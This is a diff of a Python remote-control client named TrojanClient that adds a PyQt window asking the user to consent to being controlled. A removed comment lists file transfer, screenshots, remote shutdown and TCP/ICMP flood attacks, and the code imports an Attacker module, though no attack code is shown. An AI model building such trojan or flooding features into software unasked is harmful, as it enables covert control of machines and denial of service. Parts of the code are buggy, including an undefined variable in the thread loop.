@@ -1,3 +1,10 @@
+from PyQt5.QtCore import pyqtSignal, QObject, Qt, QThread
+from PyQt5.QtGui import QCursor
+from PyQt5.QtWidgets import QMenu, QWidget, QApplication, QListWidgetItem, QAction, QCheckBox, QLabel, QMessageBox
+import client
+from clientUIDefinition import Ui_MainWindow
+import sys
+from threading import Thread
 import configparser
 import json
 import os
@@ -7,31 +14,16 @@ import sys
 import psutil
 from PIL import ImageGrab, Image
 from Attacker import Attacker
-from FileExplorer import FileExplorer
-from ThreadExplorer import ThreadExplorer
-from PyQt5.QtWidgets import QApplication, QMainWindow, QMessageBox
-from PyQt5.QtCore import QThread, pyqtSignal
-
-'''
-功能:
-    1. 文件传输
-    2. 聊天
-    3. tcp, icmp 洪水攻击
-    4. 截屏
-    5. 远程关机
-'''
-
 import platform
 import subprocess
 import time
 from queue import Queue
-from threading import Thread
+from FileExplorer import FileExplorer
+from ThreadExplorer import ThreadExplorer
 
 config = configparser.ConfigParser()
 config.read('config.ini', 'utf8')
-
 master_ip = config.get('client', 'masterIp')
-
 
 def restart_program():
     print("正在重启...")
@@ -76,9 +68,79 @@ def get_host_ip():
             s.close()
     return ip
 
+class ClientMain(QWidget, Ui_MainWindow):
+    def __init__(self):
+        super().__init__()
+        self.setupUi(self)
+        self.bind()
 
-class TrojanClient:
+    def bind(self):
+        self.pushButton.clicked.connect(self.startMain)
+
+    def startMain(self):
+        reply = QMessageBox.question(self, '提示', '确定被控吗?',QMessageBox.Yes | QMessageBox.No, QMessageBox.No)
+
+        if reply == QMessageBox.Yes:
+            self.pushButton.setText('正被管理')
+            self.pushButton.setEnabled(False)
+            self.cal = clientThread()
+            self.cal.ipsiganal.connect(self.setip)
+            self.cal.threadsignal.connect(self.threadcrtlbox)
+            self.cal.start()
+            # thread = Thread(target=client.mainStart)
+            # thread.start()
+            # thread.join()
+        else:
+            pass
+
+    def setip(self,ipmessage):
+        self.iplabel.setText(ipmessage)
+
+    def threadcrtlbox(self):
+        reply = QMessageBox.question(self, '提示', '是否接收进程控制?',QMessageBox.Yes | QMessageBox.No, QMessageBox.No)
+        if reply == QMessageBox.Yes:
+            pass
+        else:
+            pass
+
+class clientThread(QThread):
+    ipsiganal = pyqtSignal(str)
+    threadsignal = pyqtSignal()
+    def __init__(self):
+        super().__init__()
+    
+    def run(self):
+        port = 13400
+        i = 0
+        while i <= 32:
+            port += i
+            try:
+                self.trojanServer = TrojanClient(int(port))#初始化
+                self.trojanServer.searchMaster()
+                ipmessage = "控制端ip:"+str(self.trojanServer.masterIP)+" 本机ip:"+str(self.trojanServer.ownip)+" 管理udp端口:"+str(self.trojanServer.masterUdpPort)+" 管理tcp端口"+str(self.trojanServer.masterTcpPort)+" 本机udp服务端口:"+ str(self.trojanServer.udpRecvPort)
+                self.ipsiganal.emit(ipmessage)
+                while True:
+                    trojanServer.searchMaster()
+                    time.sleep(60)
+
+        #         self.udpPort = udpPort #
+        # self.udpRecvPort = udpPort + 1 #受控端udp接收端口
+        # self.masterIP = master_ip #控制端ip
+        # self.masterUdpPort = config.getint('client', 'masterUdpPort') #此端口与控制端udp接收端口相同
+        # self.masterTcpPort = config.getint('client', 'masterTcpPort') #此端口与控制端tcp端口相同
+        # self.ownip = get_host_ip() #获取了自己的ip，受控端ip
+                # while True:
+                #     trojanServer.searchMaster()
+                #     time.sleep(60)
+            except:
+                print("error")
+            finally:
+                i += 4
+
+
+class TrojanClient(clientThread):
     def __init__(self, udpPort=8082):
+        super().__init__()
         # configs
         self.udpPort = udpPort #
         self.udpRecvPort = udpPort + 1 #受控端udp接收端口
@@ -87,11 +149,16 @@ class TrojanClient:
         self.masterTcpPort = config.getint('client', 'masterTcpPort') #此端口与控制端tcp端口相同
         self.ownip = get_host_ip() #获取了自己的ip，受控端ip
         print(self.ownip)
+        # ipmessage = "控制端ip:"+str(self.masterIP)+" 本机ip:"+str(self.ownip)+" 管理udp端口:"+str(self.masterUdpPort)+" 管理tcp端口"+str(self.masterTcpPort)+" 本机udp服务端口:"+ str(self.udpRecvPort)
+        # print(ipmessage)
+        # self.ipsiganal.emit(ipmessage)
         self.cwd = os.getcwd() #当前工作目录
+        #print("initialization1")
         self.fileExplorer = FileExplorer() #初始化一个list，是当前目录下所有文件的，但还没有调用，是通过一个exec函数调用的
+        #print("initialization2")
         self.threadExplorer = ThreadExplorer()
         self.p = None
-
+        
         self.enableRun = True
         self.realCmdQ = Queue()
         self.commandThread = Thread(target=self.cmdRecv) #判断os，然后到run_command
@@ -324,7 +391,7 @@ class TrojanClient:
             elif cmd == "ls":
                 self.transportList()
             
-            elif cmd == "thread":
+            elif cmd == "thread":#dddddddddddddddddddneed QmessageBox.Question
                 
                 print("Start thread control")
                 self.thransportThread()
@@ -383,23 +450,8 @@ class TrojanClient:
             self.tcpSend("response", str(e))
 
 
-def mainStart(port=13400):
-    i = 0
-    while i <= 20:
-        port += i
-        try:
-            trojanServer = TrojanClient(int(port))#初始化
-            trojanServer.searchMaster()
-            while True:
-                trojanServer.searchMaster()
-                time.sleep(60)
-        except:
-            print("error")
-        finally:
-            i += 4
-
-
 if __name__ == '__main__':
-    thread = Thread(target=mainStart)
-    thread.start()
-    thread.join()
+    app = QApplication(sys.argv)
+    MainWin = ClientMain()
+    MainWin.show()
+    sys.exit(app.exec_())
